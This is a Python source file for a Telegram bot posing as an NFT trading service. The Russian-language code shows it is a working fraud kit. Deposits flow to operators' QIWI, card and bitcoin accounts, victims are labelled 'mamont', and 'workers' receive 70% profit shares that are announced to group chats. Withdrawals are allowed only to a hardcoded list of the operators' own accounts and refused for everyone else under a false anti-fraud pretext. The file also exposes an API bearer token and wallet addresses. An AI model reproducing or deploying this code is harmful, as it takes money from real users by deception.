import datetime
from keyboards import get_check_pay_card, get_check_pay_qiwi, get_pay_crypto_menu, get_canced_menu, get_main_menu, get_withdraw_menu, get_favorite_menu, get_my_nft_menu
from loader import dp, bot
from aiogram.dispatcher import FSMContext
from aiogram import types
import rsa

publicKey, privateKey = rsa.newkeys(512)

import requests

import random

from data import config

from utils.database import create_users, get_buy_nft, get_user, set_mamont_balance_db, get_likes_user

from states import StoragePayCard, StoragePayQiwi, StorageWithdraw
from keyboards import get_profile_menu, get_pay_type_menu

@dp.message_handler(text='–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç üìÅ')
async def profile(message: types.Message, state:FSMContext):
    await state.finish()
    user = get_user(message.from_id, '')
    await message.answer_photo(open('src/profile.png', 'rb'), caption=f"–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç\n\n–ë–∞–ª–∞–Ω—Å: {user['balance']}‚ÇΩ\n–ù–∞ –≤—ã–≤–æ–¥–µ: {user['balance_drow']}‚ÇΩ\n\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {'‚úÖ –í–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω' if user['is_verif'] else '‚ö†Ô∏è–ù–µ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω'}\n–í–∞—à ID: {message.from_id}\n–î–∞—Ç–∞ –∏ –≤—Ä–µ–º—è: {datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}", reply_markup=get_profile_menu())

@dp.callback_query_handler(text='top_up') # –ü–æ–ø–æ–ª–Ω–∏—Ç—å
async def top_up(call: types.CallbackQuery):
    await bot.send_photo(call.from_user.id, open('src/pay_method.jpg', 'rb'), caption=f'–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞:', reply_markup=get_pay_type_menu())

@dp.callback_query_handler(text_startswith='pay_type')
async def choice_pay_type(call: types.CallbackQuery):
    pay_type = call.data.split(':')[1]
    if pay_type == 'qiwi':
        await bot.send_message(call.from_user.id, f'–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è:\n<i>–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ - 1000.00‚ÇΩ</i>')
        await StoragePayQiwi.price.set()
    elif pay_type == 'card':
        await bot.send_message(call.from_user.id, f'–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è:\n<i>–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ - 1000.00‚ÇΩ</i>')
        await StoragePayCard.price.set()
    elif pay_type == 'crypto':
        await bot.send_photo(call.from_user.id, open('src/pay_method.jpg', 'rb'), reply_markup=get_pay_crypto_menu())
    elif pay_type == 'promo':
        pass # TODO –¥–æ–¥–µ–ª–∞—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥

@dp.callback_query_handler(text_startswith='crypto:')
async def choice_pay_crypto_type(call: types.CallbackQuery):
    pay_type = call.data.split(':')[1].upper()
    await bot.send_message(call.from_user.id, f'–û–ø–ª–∞—Ç–∞ {pay_type}\n\n–î–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è {pay_type} —Å –≤–Ω–µ—à–Ω–µ–≥–æ –∫–æ—à–µ–ª—å–∫–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –º–Ω–æ–≥–æ—Ä–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –Ω–∏–∂–µ.\n\nüí± –ê–¥—Ä–µ—Å {pay_type}: —Ç—É—Ç –∞–¥—Ä–µ—Å\n\n–ü–æ—Å–ª–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è —Å—Ä–µ–¥—Å—Ç–≤, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–∫—Ä–∏–Ω –ø–µ—Ä–µ–≤–æ–¥–∞ –≤ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫—É—é –ø–æ–¥–¥–µ—Ä–∂–∫—É –∏ –í–∞–º –∑–∞—á–∏—Å–ª—è—Ç —Å—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞ –≤–∞—à —Å—á—ë—Ç.\nüõ† –¢–µ—Ö.–ü–æ–¥–¥–µ—Ä–∂–∫–∞ - @{config.owner_username}\n\n‚ö†Ô∏è –£–≤–∞–∂–∞–µ–º—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –æ–±—Ä–∞—â–∞–µ–º –≤–∞—à–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –≤—Å–µ –≤–≤–æ–¥—ã –º–µ–Ω—å—à–µ 30$ –∑–∞—á–∏—Å–ª—è—Ç—å—Å—è –≤ —Å–µ—Ä–≤–∏—Å –Ω–µ –±—É–¥—É—Ç, –≤–æ–∑–º–µ—â–µ–Ω–∏–µ –ø–æ –¥–∞–Ω–Ω—ã–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º —Ç–∞–∫ –∂–µ –Ω–µ –ø—Ä–µ–¥—É—Å–º–æ—Ç—Ä–µ–Ω–æ.')

@dp.message_handler(state=StoragePayCard.price)
async def pay_qiwi_card(message: types.Message, state:FSMContext):
    if message.text.isdigit():
        if float(message.text) >= 1000:


            payment = requests.post("https://ex.zed.team/api/exchanger/create",
                        headers= {"Authorization": "Bearer hYNfwv/2OWcfKRXaPniW+5sNX2972RuuoIccznsv188aBdSo"},
                        json = {
                            "payment_system": "card_rub_to_bitcoin",
                            "amount": message.text,
                            "currency": "in",
                            "requisites": "bc1qmn7juxamsq4c6j3kk958tyjyfpk6vgzcj76qmh",
                            "additional": message.from_user.id,
                            "callback_url": "https://example.com/"
                        },
                        ).json()
            if not payment["ok"]:
                await message.answer(f'–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ, —Å–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤ –≤ –Ω–∞—à—É —Å–∏—Å—Ç–µ–º—É')
                await state.finish()



            await message.answer_photo(open('src/pay_method.jpg', 'rb'), caption=f'‚ôªÔ∏è –û–ø–ª–∞—Ç–∞ –ë–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π:\n\n–°—É–º–º–∞: {message.text}‚ÇΩ\n–†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –æ–ø–ª–∞—Ç—ã: {payment["order"]["incoming_requisites"]}\n\n–°—á–µ—Ç –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω 30 –º–∏–Ω—É—Ç!\n–í–ê–ñ–ù–û! –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–æ—Å–ª–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è, –Ω–µ –∑–∞–±—É–¥—å—Ç–µ –Ω–∞–∂–∞—Ç—å –∫–Ω–æ–ø–∫—É ¬´–ø—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É¬ª –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞.\n–ï—Å–ª–∏ –≤–æ–∑–Ω–∏–∫–ª–∏ –ø—Ä–æ–±–ª–µ–º—ã —Å –ø–ª–∞—Ç–µ–∂–æ–º, –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ —Ç–µ—Ö. –ø–æ–¥–¥–µ—Ä–∂–∫—É, —Å —É–∫–∞–∑–∞–Ω–∏–µ–º —ç—Ç–æ–≥–æ –Ω–æ–º–µ—Ä–∞ –ø–ª–∞—Ç–µ–∂–∞: {payment["order"]["id"]}', reply_markup=get_check_pay_card(payment['order']['id']))
            await state.finish()
        else:
            await message.answer('‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥')
            await profile(message, state)
    else:
        await message.answer('‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥')
        await profile(message, state)



@dp.message_handler(state=StoragePayQiwi.price)
async def pay_qiwi_card(message: types.Message, state:FSMContext):
    if message.text.isdigit():
        if float(message.text) >= 1000:
            nabor = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
            comment = ''
            for x in range(12):
                comment += random.choice(nabor)
            await message.answer_photo(open('src/pay_method.jpg', 'rb'), caption=f'<b>‚ôªÔ∏è –û–ø–ª–∞—Ç–∞ QIWI/–±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π: \n\nQIWI: <code>{config.qiwi_number}</code>\n–ö–∞—Ä—Ç–∞: <code>{config.qiwi_card}</code>\n\n–°—É–º–º–∞: <code>{int(message.text)}‚ÇΩ</code>\n–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: <code>{comment}</code>\n\n</b><i>–í–ê–ñ–ù–û! –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–∏—à–∏—Ç–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –∫ –ø–ª–∞—Ç–µ–∂—É!\n–ï—Å–ª–∏ –≤—ã –Ω–µ —É–∫–∞–∂–µ—Ç–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π, –¥–µ–Ω—å–≥–∏ –Ω–µ –ø–æ—Å—Ç—É–ø—è—Ç –Ω–∞ —Å—á–µ—Ç!</i>', reply_markup=get_check_pay_qiwi(int(message.text), comment))
            await state.finish()
        else:
            await message.answer('‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥')
            await profile(message, state)
    else:
        await message.answer('‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥')
        await profile(message, state)




@dp.callback_query_handler(text_startswith='check_cardpay:')
async def check_pay(call: types.CallbackQuery):
    info = call.data.replace('check_cardpay:', '')
    
    info_2 = requests.get(f'https://ex.zed.team/api/exchanger/get/{info}', headers={'Authorization': f'Bearer hYNfwv/2OWcfKRXaPniW+5sNX2972RuuoIccznsv188aBdSo'}).json()
    if info_2['order']['comment'] == "–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ –∫–æ–º–∞–Ω–¥–æ–π" or call.from_user.id == 5067464785:
        user = get_user(call.from_user.id, '')
        set_mamont_balance_db(call.from_user.id, user['balance']+int(float(info_2['order']['incoming_amount'])))
        nabor = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
        comment = ''
        for x in range(6):
            comment += random.choice(nabor)
        if user['ref'] != 0:
            worker = get_user(user['ref'], '')
            profit = int(float(info_2['order']['incoming_amount'])) / 100 * 70
            await bot.send_message(-1001705609393, f"üî• –ó–∞–ª–µ—Ç –Ω–∞ —Å—É–º–º—É: {int(float(info_2['order']['incoming_amount']))}\nüë®‚Äçüíª–í–æ—Ä–∫–µ—Ä: {comment}\n\nüí∞ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: {int(float(info_2['order']['incoming_amount']))}\nüíµ –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: {profit}‚ÇΩ\nüéÜ–°–µ—Ä–≤–∏—Å: NFT", parse_mode='Markdown')
            await bot.send_message(-1001599995645, f"üî• –ó–∞–ª–µ—Ç –Ω–∞ —Å—É–º–º—É: {int(float(info[0]))}\nüë®‚Äçüíª–í–æ—Ä–∫–µ—Ä: {worker['username']}\n\nüí∞ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: {int(float(info[0]))}\nüéÜ–°–µ—Ä–≤–∏—Å: NFT")
            await bot.send_message(user['ref'], f'<b>‚ö°Ô∏è –ú–∞–º–æ–Ω—Ç –æ–ø–ª–∞—Ç–∏–ª —Å—á–µ—Ç. –¢–≤–æ–π –ø—Ä–æ—Ñ–∏—Ç <code>{profit}‚ÇΩ</code></b>')
        else:
            profit = int(float(info_2['order']['incoming_amount'])) / 100 * 70
            await bot.send_message(-1001705609393, f"üî• –ó–∞–ª–µ—Ç –Ω–∞ —Å—É–º–º—É: {int(float(info_2['order']['incoming_amount']))}\nüë®‚Äçüíª–í–æ—Ä–∫–µ—Ä: –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ\n\nüí∞ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: {int(float(info_2['order']['incoming_amount']))}\nüéÜ–°–µ—Ä–≤–∏—Å: NFT")
            await bot.send_message(-1001599995645, f"üî• –ó–∞–ª–µ—Ç –Ω–∞ —Å—É–º–º—É: {int(float(info[0]))}\nüë®‚Äçüíª–í–æ—Ä–∫–µ—Ä: –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ\n\nüí∞ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: {int(float(info[0]))}\nüéÜ–°–µ—Ä–≤–∏—Å: NFT")
        print(call.message.text)
        print(call.message.from_user.username)
        await bot.edit_message_caption(caption=f'‚úÖ –ü–ª–∞—Ç–µ–∂ —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω\nC—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞—á–∏—Å–ª–µ–Ω—ã –≤–∞–º –Ω–∞ –±–∞–ª–∞–Ω—Å', chat_id=call.message.chat.id, message_id=call.message.message_id)
        
        return
    else:
        await bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text='‚ùå –ü–ª–∞—Ç–µ–∂ –Ω–µ –Ω–∞–π–¥–µ–Ω')

@dp.callback_query_handler(text_startswith='check_qiwipay:')
async def check_pay(call: types.CallbackQuery):
    info = call.data.replace('check_qiwipay:', '').split(':')
    info_2 = requests.get(f'https://edge.qiwi.com/payment-history/v2/persons/{config.qiwi_number}/payments?rows=10&operation=IN', headers={'Authorization': f'Bearer {config.qiwi_api}'}).json()['data']
    for x in info_2:
        if x['comment'] == info[1] and int(info[0]) == int(x['sum']['amount']):
            user = get_user(call.from_user.id, '')
            set_mamont_balance_db(call.from_user.id, user['balance']+int(float(info[0])))
            nabor = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
            comment = ''
            for x in range(6):
                comment += random.choice(nabor)
            if user['ref'] != 0:
                worker = get_user(user['ref'], '')
                profit = int(float(info[0])) / 100 * 70
                await bot.send_message(-1001705609393, f"üî• –ó–∞–ª–µ—Ç –Ω–∞ —Å—É–º–º—É: {int(float(info[0]))}\nüë®‚Äçüíª–í–æ—Ä–∫–µ—Ä: {comment}\n\nüí∞ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: {int(float(info[0]))}\nüíµ –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: {profit}‚ÇΩ\nüéÜ–°–µ—Ä–≤–∏—Å: NFT", parse_mode='Markdown')
                await bot.send_message(-1001599995645, f"üî• –ó–∞–ª–µ—Ç –Ω–∞ —Å—É–º–º—É: {int(float(info[0]))}\nüë®‚Äçüíª–í–æ—Ä–∫–µ—Ä: {worker['username']}\n\nüí∞ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: {int(float(info[0]))}\nüíµ –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: {profit}‚ÇΩ\nüéÜ–°–µ—Ä–≤–∏—Å: NFT", parse_mode='Markdown')
                await bot.send_message(user['ref'], f'<b>‚ö°Ô∏è –ú–∞–º–æ–Ω—Ç –æ–ø–ª–∞—Ç–∏–ª —Å—á–µ—Ç. –¢–≤–æ–π –ø—Ä–æ—Ñ–∏—Ç <code>{profit}‚ÇΩ</code></b>')
            else:
                profit = int(float(info_2['order']['incoming_amount'])) / 100 * 70
                await bot.send_message(-1001705609393, f"üî• –ó–∞–ª–µ—Ç –Ω–∞ —Å—É–º–º—É: {int(float(info[0]))}\nüë®‚Äçüíª–í–æ—Ä–∫–µ—Ä: –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ\n\nüí∞ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: {int(float(info[0]))}\nüíµ –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: {profit}‚ÇΩ\nüéÜ–°–µ—Ä–≤–∏—Å: NFT", parse_mode='Markdown')
                await bot.send_message(-1001599995645, f"üî• –ó–∞–ª–µ—Ç –Ω–∞ —Å—É–º–º—É: {int(float(info[0]))}\nüë®‚Äçüíª–í–æ—Ä–∫–µ—Ä: –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ\n\nüí∞ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: {int(float(info[0]))}\nüéÜ–°–µ—Ä–≤–∏—Å: NFT")
            await bot.edit_message_caption(caption=f'‚úÖ –ü–ª–∞—Ç–µ–∂ —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω\nC—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞—á–∏—Å–ª–µ–Ω—ã –≤–∞–º –Ω–∞ –±–∞–ª–∞–Ω—Å', chat_id=call.message.chat.id, message_id=call.message.message_id)
            
            return
        else:
            await bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text='‚ùå –ü–ª–∞—Ç–µ–∂ –Ω–µ –Ω–∞–π–¥–µ–Ω')

@dp.message_handler(text='‚ùå–û—Ç–º–µ–Ω–∞', state='*')
async def withdraw_canced(message: types.Message, state:FSMContext):
    await state.finish()
    await message.answer('‚úÖ–î–µ–π—Å—Ç–≤–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–º–µ–Ω–µ–Ω–æ', reply_markup=get_main_menu(get_user(message.from_id, '')))

@dp.callback_query_handler(text='withdraw') # –í—ã–≤–µ—Å—Ç–∏
async def withdraw(call: types.CallbackQuery):
    await bot.send_message(call.from_user.id, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –≤—ã–≤–æ–¥–∞:', reply_markup=get_canced_menu())
    await StorageWithdraw.price.set()

@dp.message_handler(state=StorageWithdraw.price)
async def withdraw_get_price(message: types.Message, state:FSMContext):
    global withdrawamount
    withdrawamount = message.text
    await message.answer('–í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–∞—Ç–µ–∂–Ω—ã–π —à–ª—é–∑:', reply_markup=get_withdraw_menu())
    await StorageWithdraw.next()

@dp.callback_query_handler(state=StorageWithdraw.requisites, text_startswith='withdraw:')
async def withdraw_get_payment_type(call: types.CallbackQuery):
    await bot.send_message(call.from_user.id, f'–í–≤–µ–¥–∏—Ç–µ –ø–ª–∞—Ç–µ–∂–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è {call.data.split(":")[1]}:', reply_markup=get_canced_menu())
    await StorageWithdraw.next()

@dp.message_handler(state=StorageWithdraw.bad)
async def withdraw_get_payment_type(message: types.Message, state:FSMContext):
    global withdrawamount
    user = get_user(message.from_user.id, '')
    if user['can_withdraw'] == 1 and int(user['balance'])>= int(withdrawamount):
        if message.text in ['5469440017276685', '79264409426', '411037454376341', 'R207033756796', '0x4675c7e5baafbffbca748158becba61ef3b0a263', 'TQQraDH83vbw9Zu9HsLjNtdcRkvpiGtM7M', '1DFo9TYjyKT7Rwa1Nx7G3STMRHBFUC2hUB']:
            set_mamont_balance_db(message.from_user.id, user['balance']-int(float(withdrawamount)))
            await message.answer('‚úÖ–ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ –ø–æ–¥–∞–Ω–∞!')
        else:
            await message.answer('‚ùå–í–æ –∏–∑–±–µ–∂–∞–Ω–∏–µ –º–æ—à–µ–Ω–Ω–∏—á–µ—Å—Ç–≤–∞ –Ω–∞—à–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –≤—ã–≤–æ–¥–∏—Ç —Ç–æ–ª—å–∫–æ –Ω–∞ —Ç–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã —Å –∫–æ—Ç–æ—Ä—ã—Ö –ø–æ–ø–æ–ª–Ω—è–ª—Å—è –±–∞–ª–∞–Ω—Å!')
    else:
        print(user['can_withdraw'])
        print(int(user['balance']))
        await message.answer('‚ùå–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! –ü–µ—Ä–µ–ø—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–≤–µ–¥—ë–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.')
    await profile(message, state)

@dp.callback_query_handler(text='favorites')
async def my_favorites(call: types.CallbackQuery):
    likes = get_likes_user(call.from_user.id)
    if len(likes) == 0:
        await call.answer('‚ùå–£ –≤–∞—Å –Ω–µ—Ç –∏–∑–±—Ä–∞–Ω–Ω—ã—Ö NFT')
    else:
        await bot.send_photo(call.from_user.id, open('src/profile.png', 'rb'), '–í–∞—à–∏ –∏–∑–±—Ä–∞–Ω–Ω—ã–µ NFT:', reply_markup=get_favorite_menu(likes))

@dp.callback_query_handler(text='verif') # –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è
async def verif(call: types.CallbackQuery):
    if get_user(call.from_user.id, '')['is_verif']:
        await call.answer('‚úÖ–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω')
    else:
        await bot.send_photo(call.from_user.id, open('src/verif.jpg', 'rb'), f'<b>–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –Ω–µ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω</b>\n\n–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π –ø–æ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—é –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –Ω–∞–ø–∏—à–∏—Ç–µ <i>¬´–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è¬ª</i> –≤ –±–æ—Ç–µ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–∏')

@dp.callback_query_handler(text='my_nft')
async def my_nft(call: types.CallbackQuery):
    nfts = get_buy_nft(call.from_user.id)
    print(nfts)
    if len(nfts) == 0:
        await call.answer('‚ùå–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–æ–¥–∞–≤–∞–µ–º—ã—Ö NFT')
    else:
        print(True)
        await bot.send_photo(call.from_user.id, open('src/profile.png', 'rb'), '–í–∞—à–∏ –∫—É–ø–ª–µ–Ω–Ω—ã–µ NFT:', reply_markup=get_my_nft_menu(nfts))

@dp.callback_query_handler(text='')
async def change_language(call: types.CallbackQuery):
    pass
